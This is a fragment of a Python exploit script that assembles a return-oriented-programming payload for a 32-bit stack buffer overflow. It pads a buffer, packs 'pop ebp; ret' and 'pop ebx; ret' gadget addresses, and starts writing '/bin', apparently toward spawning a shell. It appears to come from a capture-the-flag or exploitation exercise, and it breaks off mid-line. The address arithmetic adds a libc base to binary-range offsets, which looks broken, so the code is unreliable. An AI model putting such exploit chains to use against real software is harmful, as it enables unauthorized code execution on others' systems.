import sys
import struct
from subprocess import Popen

def p(a):
  return struct.pack("<I", a)

def u(a):
  return struct.unpack("<I", a)[0]

bufsize = 38
data_addr = 0x0804a034
libc_addr = 0xb7e3fda0

buf = 'A' * bufsize
buf += 'AAAA' * 3

buf += p(libc_addr + 0x080488ab) # pop ebp ; ret
buf += p(data_addr)
buf += p(libc_addr + 0x08048579) # pop ebx ; ret
buf += "/bin"
buf += p(libc_addr + 0x000) # 
